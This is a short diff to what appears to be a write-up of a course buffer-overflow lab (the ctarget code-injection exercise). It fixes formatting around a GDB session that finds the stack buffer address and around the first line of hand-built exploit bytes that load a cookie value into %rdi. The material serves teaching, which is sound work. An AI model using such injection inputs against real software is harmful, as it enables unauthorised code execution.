@@ -155,7 +155,7 @@ Then we can use GDB to inspect the values of the memory in the stack frame. From
 ```sh
 $ gdb ./ctarget
 GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
-"...
+...
 Reading symbols from ./ctarget...
 
 # Set breakpoint in getbuf right after Gets returns
@@ -186,7 +186,7 @@ We can see that our input bytes start at address `0x55609288`. The last line sho
 
 We can now create our final buffer overflow input:
 
-```asm
+```hex
 $ cat inp.txt
 /* Exploit code */
 48 c7 c7 0e 66 21 5d    /* mov    $0x5d21660e,%rdi */
